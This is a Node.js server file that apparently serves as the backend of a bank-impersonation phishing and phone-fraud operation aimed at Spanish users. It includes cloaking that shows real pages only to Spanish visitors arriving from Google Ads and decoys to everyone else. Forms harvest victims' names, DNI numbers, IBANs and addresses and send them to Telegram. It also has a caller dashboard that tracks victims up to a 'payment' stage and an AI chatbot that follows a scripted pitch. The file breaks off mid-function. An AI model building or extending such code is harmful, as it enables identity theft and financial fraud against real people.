import { appendFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { config } from './config.js';
import { createAccessToken, isGranted } from './grantStore.js';
import { HUMAN_UI, BOT_UI } from './humanUi.js';
import { maskName, maskPhone, sanitizeString } from './mask.js';
import { sendToTelegram, sendToTelegramWithButton } from './telegram.js';
import { lookupGeoByIp } from './geoLookup.js';
import { prisma } from './db.js';
import { getBotConfig, updateBotConfig } from './ai/botConfig.js';
import { deepseekChat } from './ai/deepseek.js';
import { buildSystemPrompt } from './ai/promptBuilder.js';
import { randomUUID } from 'node:crypto';

// ── Admin sessions (in-memory, очищаются при рестарте) ────────────────────────
const adminSessions = new Set();
const callerSessions = new Set();

// ── SSE broadcast ─────────────────────────────────────────────────────────────
const sseClients = new Set();

function broadcastUpdate(type = 'clients_changed') {
  const msg = `data: ${JSON.stringify({ type })}\n\n`;
  for (const raw of [...sseClients]) {
    try { raw.write(msg); } catch { sseClients.delete(raw); }
  }
}

function requireAdmin(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (!token || !adminSessions.has(token)) {
    reply.status(401).send({ error: 'Unauthorized' });
    return false;
  }
  return true;
}

function requireCaller(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (!token || (!callerSessions.has(token) && !adminSessions.has(token))) {
    reply.status(401).send({ error: 'Unauthorized' });
    return false;
  }
  return true;
}

// ── WebClient helpers ─────────────────────────────────────────────────────────
const STATUS_MAP = {
  tourist_bank_selected:        'КЛИЕНТ ВЫБРАЛ БАНК',
  tourist_benefit_reached:      'КЛИЕНТ ДОШЕЛ ДО LINK-BENEFIT',
  tourist_chat_reached:         'КЛИЕНТ ДОШЕЛ ДО ЧАТА',
  tourist_bot_started:          'БОТ НАЧАЛ ДИАЛОГ',
  tourist_bot_finished_dialogue:'БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_bot_finished:         'БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_card_page_opened:     'ОТКРЫЛ ФОРМУ',
  tourist_card_ordered:         'КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
  tourist_call_requested:       'ЗАПРОСИЛ ЗВОНОК',
};

async function upsertWebClient(flowSessionId, patch = {}) {
  if (!flowSessionId) return null;
  try {
    return await prisma.webClient.upsert({
      where: { flowSessionId },
      create: { flowSessionId, ...patch },
      update: patch,
    });
  } catch { return null; }
}

async function createWebEvent(flowSessionId, clientId, event, extra = {}) {
  try {
    await prisma.webEvent.create({
      data: { flowSessionId, clientId: clientId || null, event, ...extra },
    });
  } catch { /* non-fatal */ }
}

const logDir = join(tmpdir(), config.logDirName);
const scratchLogFile = join(logDir, 'scratch-verify.log');

let logDirReady = false;
async function ensureLogDir() {
  if (logDirReady) return;
  try {
    await mkdir(logDir, { recursive: true });
    logDirReady = true;
  } catch (err) {
    if (err?.code === 'EEXIST') logDirReady = true;
    else console.error('Failed to create log dir:', err);
  }
}

async function appendJsonLine(file, entry) {
  try {
    await ensureLogDir();
    await appendFile(file, `${JSON.stringify(entry)}\n`);
  } catch (err) {
    console.error('Failed to append log:', err);
  }
}

function asRecord(v) {
  return v && typeof v === 'object' && !Array.isArray(v) ? v : null;
}
function getString(v) { return typeof v === 'string' ? v : ''; }
function getNumber(v) { return typeof v === 'number' && Number.isFinite(v) ? v : null; }
function getBoolean(v) { return typeof v === 'boolean' ? v : null; }

function getHeader(req, name) {
  const v = req.headers[name];
  if (Array.isArray(v)) return typeof v[0] === 'string' ? v[0].trim() : '';
  return typeof v === 'string' ? v.trim() : '';
}

function getClientIp(req) {
  const headers = ['cf-connecting-ip', 'true-client-ip', 'x-real-ip', 'x-client-ip', 'fly-client-ip'];
  let ip = '';
  for (const h of headers) {
    ip = getHeader(req, h);
    if (ip) break;
  }
  if (!ip) {
    const fwd = getHeader(req, 'x-forwarded-for');
    ip = fwd ? (fwd.split(',')[0]?.trim() ?? '') : '';
  }
  if (!ip) ip = req.ip || req.socket?.remoteAddress || '';
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  return ip;
}

function getGeoFromHeaders(req) {
  const country =
    getHeader(req, 'cf-ipcountry') ||
    getHeader(req, 'x-vercel-ip-country') ||
    getHeader(req, 'cloudfront-viewer-country') ||
    getHeader(req, 'x-country-code');
  if (!country || country.toUpperCase() === 'XX' || country.toUpperCase() === 'UNKNOWN') return null;
  return {
    country: country.toUpperCase(),
    city: getHeader(req, 'x-vercel-ip-city') || '',
    region: getHeader(req, 'x-vercel-ip-country-region') || '',
  };
}

async function resolveGeo(req, ip) {
  const headerGeo = getGeoFromHeaders(req);
  if (headerGeo) return { available: true, geo: headerGeo, source: 'headers' };
  return lookupGeoByIp(ip);
}

function buildBotResponse(flowSessionId, extra = {}) {
  const { token, shortId } = createAccessToken();
  const json = {
    status: true,
    url: config.redirects.botRedirectUrl || '',
    ui: BOT_UI,
    accessToken: token,
    allowed: false,
    ...extra,
  };
  return { shortId, json };
}

function sendGrantButton(message, shortId) {
  console.log(`[TG] sending grant button (shortId=${shortId})`);
  sendToTelegramWithButton(
    `${message}\n\n_Нажмите кнопку чтобы дать пользователю доступ._`,
    `grant_${shortId}`,
  );
}

async function handleScratchAccess(req, reply) {
  const token = req.params.token || '';
  if (!token) return reply.status(400).send({ allowed: false });
  reply.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  reply.header('Pragma', 'no-cache');
  reply.header('Expires', '0');
  if (!isGranted(token)) return reply.send({ allowed: false });
  return reply.send({
    allowed: true,
    status: false,
    url: config.redirects.humanRedirectUrl,
    ui: HUMAN_UI,
  });
}

async function handleScratchVerify(req, reply) {
  console.log(`[scratch-verify] IN  ip=${getClientIp(req)}`);
  try {
    const body = asRecord(req.body) ?? {};
    const ip = getClientIp(req);
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80) || null;

    const geoResult = await resolveGeo(req, ip);
    const country = geoResult.geo?.country || 'UNKNOWN';
    const city = geoResult.geo?.city || '';
    const region = geoResult.geo?.region || '';
    const postal = geoResult.geo?.postal || '';

    const pointerEvents = asRecord(body.pointerEvents);
    const bbox = asRecord(body.bbox);
    const canvas = asRecord(body.canvas);
    const clearedPercent = getNumber(body.clearedPercent);

    if (clearedPercent === null || !pointerEvents || !bbox || !canvas) {
      const text = [
        '*SCRATCH - INVALID PAYLOAD*',
        flowSessionId ? `Session: \`${flowSessionId}\`` : '',
        `IP: \`${ip}\``,
        `Country: *${country}*`,
        'Reason: missing required fields',
      ].filter(Boolean).join('\n');
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(text, shortId);
      await appendJsonLine(scratchLogFile, {
        ts: new Date().toISOString(), flowSessionId, ip, country, verdict: 'invalid_payload',
      });
      return reply.send(json);
    }

    const canvasWidth = getNumber(canvas.canvasWidth);
    const canvasHeight = getNumber(canvas.canvasHeight);
    const bboxWidth = getNumber(bbox.bboxWidth) ?? 0;
    const bboxHeight = getNumber(bbox.bboxHeight) ?? 0;

    if (canvasWidth === null || canvasHeight === null) {
      const text = [
        '*SCRATCH - INVALID METRICS*',
        flowSessionId ? `Session: \`${flowSessionId}\`` : '',
        `IP: \`${ip}\``,
        `Country: *${country}*`,
      ].filter(Boolean).join('\n');
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(text, shortId);
      await appendJsonLine(scratchLogFile, {
        ts: new Date().toISOString(), flowSessionId, ip, country, verdict: 'invalid_metrics',
      });
      return reply.send(json);
    }

    const hasPointerDown = getBoolean(pointerEvents.hasPointerDown) ?? false;
    const hasPointerMove = getBoolean(pointerEvents.hasPointerMove) ?? false;
    const reasons = [];

    const clearedOk = clearedPercent >= 70;
    reasons.push(clearedOk ? `cleared: ${clearedPercent.toFixed(1)}% ok` : `cleared: ${clearedPercent.toFixed(1)}% fail`);

    const pointerAllOk = hasPointerDown && hasPointerMove;
    reasons.push(pointerAllOk ? 'pointer: ok' : 'pointer: fail');

    const widthCoverage = canvasWidth > 0 ? bboxWidth / canvasWidth : 0;
    const heightCoverage = canvasHeight > 0 ? bboxHeight / canvasHeight : 0;
    const widthValid = widthCoverage >= 0.4;
    const heightValid = heightCoverage >= 0.4;
    reasons.push(widthValid ? 'widthCov: ok' : `widthCov: ${(widthCoverage * 100).toFixed(0)}% fail`);
    reasons.push(heightValid ? 'heightCov: ok' : `heightCov: ${(heightCoverage * 100).toFixed(0)}% fail`);

    const hasCountry = Boolean(geoResult.geo?.country);
    const geoOk = hasCountry && country === 'ES';
    if (!geoResult.available) reasons.push('geo: unavailable');
    else if (!hasCountry) reasons.push('geo: UNKNOWN fail');
    else reasons.push(geoOk ? 'geo: ES ok' : `geo: ${country} fail`);

    const rawQuery = getString(body.query);
    const hasGclid = rawQuery.toLowerCase().includes('gclid');
    reasons.push(hasGclid ? 'gclid: ok' : 'gclid: fail');

    const humanLike = clearedOk && pointerAllOk && widthValid && heightValid;
    const approved = humanLike && geoOk && hasGclid;

    const user = asRecord(body.user) ?? {};
    const userName = getString(user.name);
    const userPhone = getString(user.phone);

    const lines = [
      `*SCRATCH - ${approved ? 'HUMAN' : 'BOT'}*`,
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      '',
      `IP: \`${ip}\``,
      `Country: *${country}* ${city ? `(${city})` : ''}`,
      `Query: \`${rawQuery || 'empty'}\``,
      '',
      `Login: ${userName || '-'}`,
      `Phone: ${userPhone || '-'}`,
      '',
      reasons.join('\n'),
      '',
      `humanLike: ${humanLike ? 'YES' : 'NO'}`,
      `geoOk: ${geoOk ? 'YES' : 'NO'}`,
      `hasGclid: ${hasGclid ? 'YES' : 'NO'}`,
      `Result: ${approved ? 'APPROVED → link-bank' : 'REJECTED → ожидание TG'}`,
    ].filter(Boolean);

    console.log(`[scratch-verify] verdict=${approved ? 'HUMAN' : 'BOT'} ip=${ip} country=${country}`);

    if (approved) sendToTelegram(lines.join('\n'));

    await appendJsonLine(scratchLogFile, {
      ts: new Date().toISOString(),
      flowSessionId, ip, country, city, postal,
      user: { name: maskName(userName), phone: maskPhone(userPhone) },
      verdict: approved ? 'human' : 'bot',
      humanLike, geoOk, hasGclid, reasons,
    });

    if (!approved) {
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(lines.join('\n'), shortId);
      return reply.send(json);
    }

    return reply.send({
      status: false,
      url: config.redirects.humanRedirectUrl,
      ui: HUMAN_UI,
      allowed: true,
      accessToken: null,
      geo: { country, city, region, postal },
    });
  } catch (err) {
    console.error('[SCRATCH-VERIFY ERROR]', err);
    const { json } = buildBotResponse(null);
    return reply.send(json);
  }
}

// ─── Tourist status tracking (/api/track) ────────────────────────────────────

const TOURIST_STATUS_LABELS = {
  tourist_bank_selected:       '1️⃣ КЛИЕНТ ВЫБРАЛ БАНК',
  tourist_benefit_reached:     '📋 Клиент открыл страницу ожидания',
  tourist_chat_opened:         '🔗 Клиент нажал «Iniciar conversación»',
  tourist_chat_reached:        '2️⃣ КЛИЕНТ ДОШЁЛ ДО ЧАТА',
  tourist_bot_started:         '3️⃣ БОТ НАЧАЛ ДИАЛОГ',
  tourist_bot_finished_dialogue: '4️⃣ БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_bot_finished:        '4️⃣ БОТ ЗАКОНЧИЛ ДИАЛОГ (кнопка нажата)',
  tourist_card_page_opened:    '📝 Клиент открыл форму заявки',
  tourist_card_ordered:        '5️⃣ КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
};

async function handleTrack(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const event = sanitizeString(getString(body.event), 80);
    if (!event) return reply.status(400).send({ ok: false });

    const email = sanitizeString(getString(body.email), 200);
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const bank = sanitizeString(getString(body.bank), 120);
    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';

    // Persist to DB
    const status = STATUS_MAP[event];
    const patch = {};
    if (email) patch.email = email;
    if (bank) patch.bank = bank;
    if (ip) patch.ip = ip;
    if (status) patch.status = status;

    const client = flowSessionId ? await upsertWebClient(flowSessionId, patch) : null;
    await createWebEvent(flowSessionId, client?.id, event, { bank: bank || null, email: email || null, ip: ip || null });

    // Telegram notification
    const label = TOURIST_STATUS_LABELS[event] || `📌 ${event}`;
    const lines = [
      `*${label}*`,
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      bank ? `Банк: *${bank}*` : '',
      email ? `Email: ${email}` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);

    sendToTelegram(lines.join('\n'));
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[track] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

// ─── Tourist: call request + status polling ───────────────────────────────────

async function handleCallRequest(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const email = sanitizeString(getString(body.email), 200);
    const bank = sanitizeString(getString(body.bank), 120);
    const nombre = sanitizeString(getString(body.nombre), 200);
    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';

    const patch = {
      callRequested: true,
      status: 'ЗАПРОСИЛ ЗВОНОК',
    };
    if (email) patch.email = email;
    if (bank) patch.bank = bank;
    if (nombre) patch.nombre = nombre;
    if (ip) patch.ip = ip;

    const client = flowSessionId ? await upsertWebClient(flowSessionId, patch) : null;
    await createWebEvent(flowSessionId, client?.id, 'tourist_call_requested', { bank: bank || null, email: email || null, ip: ip || null });

    const lines = [
      '*📞 ЗАПРОСИЛ ЗВОНОК*',
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      nombre ? `Имя: *${nombre}*` : '',
      bank ? `Банк: *${bank}*` : '',
      email ? `Email: ${email}` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);
    sendToTelegram(lines.join('\n'));
    broadcastUpdate('clients_changed');

    return reply.send({ ok: true });
  } catch (err) {
    console.error('[call-request] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

async function handleTouristStatus(req, reply) {
  reply.header('Cache-Control', 'no-store');
  try {
    const flowSessionId = sanitizeString(req.query.s || '', 80);
    if (!flowSessionId) return reply.send({ operatorCalled: false, operatorStatus: 'pending', iban: '' });

    let client = null;
    try {
      client = await prisma.webClient.findUnique({
        where: { flowSessionId },
        select: { operatorCalled: true, status: true, operatorStatus: true, submissionData: true, nombre: true },
      });
    } catch (e) {
      if (e?.code === 'P2022') {
        client = await prisma.webClient.findUnique({
          where: { flowSessionId },
          select: { operatorCalled: true, status: true, nombre: true },
        });
      } else throw e;
    }

    const sub = (client?.submissionData && typeof client.submissionData === 'object') ? client.submissionData : {};
    const opStatus = client?.operatorStatus ?? (client?.operatorCalled ? 'called' : 'pending');
    return reply.send({
      operatorCalled: client?.operatorCalled ?? false,
      operatorStatus: opStatus,
      iban: sub.iban || '',
      nombre: client?.nombre || sub.nombre || '',
    });
  } catch {
    return reply.send({ operatorCalled: false, operatorStatus: 'pending', iban: '' });
  }
}

// ─── Credit card form submission ──────────────────────────────────────────────

async function handleCreditCardSubmission(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const submissionData = {
      nombre: sanitizeString(getString(body.nombre), 200),
      dni: sanitizeString(getString(body.dni), 20),
      iban: sanitizeString(getString(body.iban), 50),
      calle: sanitizeString(getString(body.calle), 300),
      piso: sanitizeString(getString(body.piso), 100),
      ciudad: sanitizeString(getString(body.ciudad), 100),
      provincia: sanitizeString(getString(body.provincia), 100),
      cp: sanitizeString(getString(body.cp), 10),
      email: sanitizeString(getString(body.email), 200),
    };

    if (flowSessionId) {
      await upsertWebClient(flowSessionId, {
        nombre: submissionData.nombre || undefined,
        email: submissionData.email || undefined,
        status: 'КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
        submissionData,
      });
    }

    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';
    const lines = [
      '*5️⃣ КЛИЕНТ ЗАПОЛНИЛ ФОРМУ*',
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      submissionData.nombre ? `Имя: *${submissionData.nombre}*` : '',
      submissionData.email ? `Email: ${submissionData.email}` : '',
      submissionData.iban ? `IBAN: \`${submissionData.iban}\`` : '',
      submissionData.dni ? `DNI: \`${submissionData.dni}\`` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);
    sendToTelegram(lines.join('\n'));

    return reply.send({ ok: true });
  } catch (err) {
    console.error('[credit-card-submission] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

// ─── Caller admin ─────────────────────────────────────────────────────────────

async function handleCallerLogin(req, reply) {
  const body = asRecord(req.body) ?? {};
  const login = getString(body.login);
  const password = getString(body.password);
  if (login !== config.caller.login || password !== config.caller.password) {
    return reply.status(401).send({ error: 'Неверный логин или пароль' });
  }
  const token = randomUUID() + randomUUID();
  callerSessions.add(token);
  return reply.send({ token });
}

async function handleCallerClients(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const clients = await prisma.webClient.findMany({
      where: { callRequested: true },
      orderBy: { updatedAt: 'desc' },
      select: {
        id: true, flowSessionId: true, email: true, bank: true,
        nombre: true, ip: true, status: true, clientType: true,
        operatorCalled: true, calledAt: true, createdAt: true,
        callerNote: true, operatorStatus: true, submissionData: true,
        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
      },
    });
    return reply.send({ clients });
  } catch (err) {
    console.error('[caller-clients] primary query error, trying fallback:', err?.message || err);
    try {
      const clients = await prisma.webClient.findMany({
        where: { callRequested: true },
        orderBy: { updatedAt: 'desc' },
        select: {
          id: true, flowSessionId: true, email: true, bank: true,
          nombre: true, ip: true, status: true,
          operatorCalled: true, calledAt: true, createdAt: true,
          callerNote: true, submissionData: true,
          events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
        },
      });
      return reply.send({ clients });
    } catch (err2) {
      console.error('[caller-clients] fallback error:', err2?.message || err2);
      return reply.status(500).send({ error: 'server_error' });
    }
  }
}

async function handleCallerSetOperatorStatus(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const body = asRecord(req.body) ?? {};
    const status = sanitizeString(getString(body.status), 20);
    if (!['pending', 'called', 'payment'].includes(status)) {
      return reply.status(400).send({ error: 'invalid_status' });
    }
    const data = { operatorStatus: status };
    if (status !== 'pending') {
      data.operatorCalled = true;
      data.calledAt = new Date();
      data.status = status === 'payment' ? 'НА ЭТАПЕ ОПЛАТЫ' : 'ОПЕРАТОР ПРОЗВОНИЛ';
    } else {
      data.operatorCalled = false;
      data.calledAt = null;
    }
    try {
      await prisma.webClient.update({ where: { id }, data });
    } catch (fieldErr) {
      if (fieldErr?.message?.includes('operatorStatus') || fieldErr?.code === 'P2022') {
        const { operatorStatus: _s, ...fallbackData } = data;
        await prisma.webClient.update({ where: { id }, data: fallbackData });
      } else {
        throw fieldErr;
      }
    }
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[caller-set-status] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleCallerOldClients(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const clients = await prisma.webClient.findMany({
      where: { clientType: 'olduser' },
      orderBy: { updatedAt: 'desc' },
      select: {
        id: true, flowSessionId: true, email: true, bank: true,
        nombre: true, ip: true, status: true, clientType: true,
        operatorCalled: true, calledAt: true, createdAt: true,
        callerNote: true, operatorStatus: true, submissionData: true,
        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
      },
    });
    return reply.send({ clients });
  } catch (err) {
    console.error('[caller-old-clients] fallback:', err?.message || err);
    try {
      const clients = await prisma.webClient.findMany({
        orderBy: { updatedAt: 'desc' },
        take: 200,
        select: {
          id: true, flowSessionId: true, email: true, bank: true,
          nombre: true, ip: true, status: true,
          operatorCalled: true, calledAt: true, createdAt: true,
          callerNote: true, submissionData: true,
          events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
        },
      });
      return reply.send({ clients, _warning: 'db_migration_needed' });
    } catch (err2) {
      return reply.status(500).send({ error: 'server_error' });
    }
  }
}

async function handleCallerSetClientType(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const body = asRecord(req.body) ?? {};
    const type = sanitizeString(getString(body.type), 20);
    if (!['newuser', 'olduser'].includes(type)) {
      return reply.status(400).send({ error: 'invalid_type' });
    }
    await prisma.webClient.update({ where: { id }, data: { clientType: type } });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[caller-set-client-type] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleCallerMarkCalled(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const now = new Date();
    const client = await prisma.webClient.update({
      where: { id },
      data: { operatorCalled: true, calledAt: now, status: 'ОПЕРАТОР ПРОЗВОНИЛ' },
    });
    // Create a call log entry for audit history
    await prisma.callLog.create({ data: { clientId: id, note: 'Первичный звонок' } }).catch(() => {});
    sendToTelegram(`*✅ ОПЕРАТОР ПРОЗВОНИЛ*\nSession: \`${client.flowSessionId}\`\nБанк: *${client.bank || '—'}*\nEmail: ${client.email || '—'}`);
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[caller-mark] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleCallerNote(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const body = asRecord(req.body) ?? {};
    const note = sanitizeString(getString(body.note), 2000);
    await prisma.webClient.update({ where: { id }, data: { callerNote: note || null } });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[caller-note] error:', err?.message || err);
    // callerNote column may not exist yet — tell client to run db migration
    if (err?.message?.includes('callerNote') || err?.code === 'P2022') {
      return reply.status(503).send({ error: 'db_migration_needed', hint: 'Run: prisma db push' });
    }
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleGetCallLogs(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const [logs, clients] = await Promise.all([
      prisma.callLog.findMany({
        orderBy: { createdAt: 'desc' },
        take: 300,
        include: {
          client: {
            select: { id: true, flowSessionId: true, nombre: true, email: true, bank: true, ip: true, status: true },
          },
        },
      }),
      prisma.webClient.findMany({
        where: { callRequested: true },
        orderBy: { updatedAt: 'desc' },
        select: { id: true, nombre: true, email: true, bank: true },
      }),
    ]);
    return reply.send({ logs, clients });
  } catch (err) {
    console.error('[call-logs] error:', err?.message || err);
    // CallLog table may not exist yet — return empty gracefully
    try {
      const clients = await prisma.webClient.findMany({
        where: { callRequested: true },
        orderBy: { updatedAt: 'desc' },
        select: { id: true, nombre: true, email: true, bank: true },
      });
      return reply.send({ logs: [], clients, _warning: 'db_migration_needed' });
    } catch (err2) {
      return reply.status(500).send({ error: 'server_error' });
    }
  }
}

async function handleAddCallLog(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const clientId = sanitizeString(getString(body.clientId), 40);
    const note = sanitizeString(getString(body.note), 2000);
    if (!clientId) return reply.status(400).send({ error: 'clientId required' });
    const log = await prisma.callLog.create({ data: { clientId, note: note || null } });
    broadcastUpdate('logs_changed');
    return reply.send({ ok: true, log });
  } catch (err) {
    console.error('[add-call-log] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleMarkCallLog(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    await prisma.callLog.update({ where: { id }, data: { markedAt: new Date() } });
    broadcastUpdate('logs_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[mark-call-log] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleSSE(req, reply) {
  const token = sanitizeString(String(req.query.token || ''), 120);
  if (!token || (!adminSessions.has(token) && !callerSessions.has(token))) {
    return reply.status(401).send({ error: 'Unauthorized' });
  }
  reply.hijack();
  const raw = reply.raw;
  raw.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  raw.write('data: {"type":"connected"}\n\n');
  sseClients.add(raw);
  const ping = setInterval(() => {
    try { raw.write(':ping\n\n'); } catch { clearInterval(ping); sseClients.delete(raw); }
  }, 20000);
  req.raw.on('close', () => { clearInterval(ping); sseClients.delete(raw); });
}

// ─── Full admin: clients list ─────────────────────────────────────────────────

async function handleAdminClients(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const page = Math.max(1, parseInt(req.query.page || '1', 10));
    const limit = 50;
    const skip = (page - 1) * limit;
    const [clients, total] = await Promise.all([
      prisma.webClient.findMany({
        orderBy: { updatedAt: 'desc' },
        skip, take: limit,
        include: { events: { orderBy: { createdAt: 'asc' } } },
      }),
      prisma.webClient.count(),
    ]);
    return reply.send({ clients, total, page, pages: Math.ceil(total / limit) });
  } catch (err) {
    console.error('[admin-clients] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleAdminClientChat(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const flowSessionId = sanitizeString(req.params.sessionId || '', 80);
    const lead = await prisma.lead.findUnique({ where: { tgId: `web:${flowSessionId}` } });
    if (!lead) return reply.send({ messages: [] });
    const messages = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      select: { role: true, content: true, createdAt: true },
    });
    return reply.send({ messages });
  } catch (err) {
    console.error('[admin-client-chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ─── AI web chat (assistant.html) ─────────────────────────────────────────────
// Один лид на веб-сессию (ключ web:<flowSessionId>); память — сообщения этого лида.

function leadKeyFromSession(sessionId) {
  return `web:${sessionId}`;
}

function historyToLlm(systemPrompt, history) {
  const msgs = [{ role: 'system', content: systemPrompt }];
  for (const m of history) {
    if (m.role === 'USER') msgs.push({ role: 'user', content: m.content });
    else if (m.role === 'ASSISTANT') msgs.push({ role: 'assistant', content: m.content });
  }
  return msgs;
}

async function handleChat(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });

    const message = sanitizeString(getString(body.message), 4000);
    const start = body.start === true;
    const name = sanitizeString(getString(body.name), 120);
    const bank = sanitizeString(getString(body.bank), 120);

    if (!start && !message) return reply.status(400).send({ error: 'message required' });

    const key = leadKeyFromSession(sessionId);
    const lead = await prisma.lead.upsert({
      where: { tgId: key },
      create: { tgId: key, chatId: key, firstName: name || null },
      update: name ? { firstName: name } : {},
    });

    const cfg = await getBotConfig();
    if (!cfg.aiEnabled || !lead.aiEnabled) {
      return reply.send({ reply: '', disabled: true });
    }

    // Сохраняем входящее сообщение клиента (для start-триггера сообщения нет).
    if (message) {
      await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
    }

    const history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      take: cfg.historyLimit,
    });

    // start: если приветствие уже было — не генерируем заново, отдаём последнее.
    if (start && message === '') {
      const lastAssistant = [...history].reverse().find((m) => m.role === 'ASSISTANT');
      if (lastAssistant) return reply.send({ reply: lastAssistant.content });
    }

    const system = buildSystemPrompt(cfg.systemPrompt, { name, bank });
    const llmMessages = historyToLlm(system, history);
    if (start && history.length === 0) {
      llmMessages.push({ role: 'user', content: '[El usuario acaba de abrir el chat. Salúdale e inicia el guion.]' });
    }

    const rawReply = await deepseekChat(llmMessages, {
      model: cfg.model,
      temperature: cfg.temperature,
      maxTokens: cfg.maxTokens,
    });

    const isDone = rawReply.includes('[[FIN]]');
    const replyText = rawReply.replace(/\[\[FIN\]\]/g, '').trim();

    await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });
    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}) });
  } catch (err) {
    console.error('[chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'chat_failed' });
  }
}

async function handleChatHistory(req, reply) {
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  reply.header('Cache-Control', 'no-store');
  if (!sessionId) return reply.send({ messages: [] });
  const lead = await prisma.lead.findUnique({ where: { tgId: leadKeyFromSession(sessionId) } });
  if (!lead) return reply.send({ messages: [] });
  const history = await prisma.message.findMany({
    where: { leadId: lead.id },
    orderBy: { createdAt: 'asc' },
    select: { role: true, content: true },
  });
  return reply.send({
    messages: history.map((m) => ({ role: m.role.toLowerCase(), content: m.content })),
  });
}

// ─── Admin panel (/admin.html) ────────────────────────────────────────────────

async function handleAdminLogin(req, reply) {
  const body = asRecord(req.body) ?? {};
  const login = getString(body.login);
  const password = getString(body.password);
  if (login !== config.admin.login || password !== config.admin.password) {
    return reply.status(401).send({ error: 'Неверный логин или пароль' });
  }
  const token = randomUUID() + randomUUID();
  adminSessions.add(token);
  return reply.send({ token });
}

async function handleAdminLogout(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
